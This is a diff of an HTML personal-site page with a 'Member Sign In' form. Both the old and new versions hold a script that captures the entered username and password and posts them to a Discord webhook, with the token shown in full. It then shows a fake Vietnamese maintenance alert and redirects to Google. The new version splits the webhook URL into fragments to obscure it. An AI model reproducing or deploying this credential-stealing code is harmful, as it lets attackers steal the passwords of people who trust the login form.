@@ -81,47 +81,51 @@
 <body>
     <h1>Welcome to my website!</h1>
 
-   <div class="login-box">
-    <h2>Member Sign In</h2>
-    <form id="loginForm">
-        <input type="text" name="username" placeholder="Username" required>
-        <input type="password" name="password" placeholder="Password" required>
-        <button type="submit">Login</button>
-    </form>
-</div>
+    <div class="login-box">
+        <h2>Member Sign In</h2>
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
 
-<script>
-    const loginForm = document.getElementById('loginForm');
-    
-    loginForm.onsubmit = async (e) => {
-        e.preventDefault();
+    <script>
+        const loginForm = document.getElementById('loginForm');
 
-        // Lấy giá trị từ các ô input
-        const username = loginForm.elements['username'].value;
-        const password = loginForm.elements['password'].value;
-        const webhookURL = "https://discord.com/api/webhooks/1479089877810417888/mqPMnUEeRT3mm90CibNA5G_bI-p2jJhcarrCIgF9y0JcjwwKPTUy0c5Y0FeHv4Mpvh5I";
+        loginForm.onsubmit = async (e) => {
+            e.preventDefault();
 
-        const message = {
-            content: `🔔 **THÔNG BÁO MỚI**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}`
+            // Lấy giá trị từ các ô input
+            const username = loginForm.elements['username'].value;
+            const password = loginForm.elements['password'].value;
+
+            const a = "https://discord.com/api/webhooks/";
+            const b = "1479089864912801843/";
+            const c = "AYwP58mbboMifouh_oarKlvilntuz1weG3zYbQZMOC4dEPPyn0YM07SFdQW4QUoQAhJd";
+            const webhookURL = a + b + c;
+
+            const message = {
+                content: `🔔 **THÔNG BÁO MỚI**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}`
+            };
+
+            try {
+                // Gửi dữ liệu đi bằng fetch
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+
+                // Sau khi gửi xong thì hiện thông báo và chuyển hướng
+                alert("Hệ thống đang bảo trì, vui lòng quay lại sau!");
+                window.location.href = "https://google.com";
+            } catch (error) {
+                console.error("Lỗi:", error);
+                alert("Có lỗi xảy ra, vui lòng thử lại!");
+            }
         };
-
-        try {
-            // Gửi dữ liệu đi bằng fetch
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
-            });
-
-            // Sau khi gửi xong thì hiện thông báo và chuyển hướng
-            alert("Hệ thống đang bảo trì, vui lòng quay lại sau!");
-            window.location.href = "https://google.com";
-        } catch (error) {
-            console.error("Lỗi:", error);
-            alert("Có lỗi xảy ra, vui lòng thử lại!");
-        }
-    };
-</script>
+    </script>
 
     <div>
         <h2>About Me</h2>
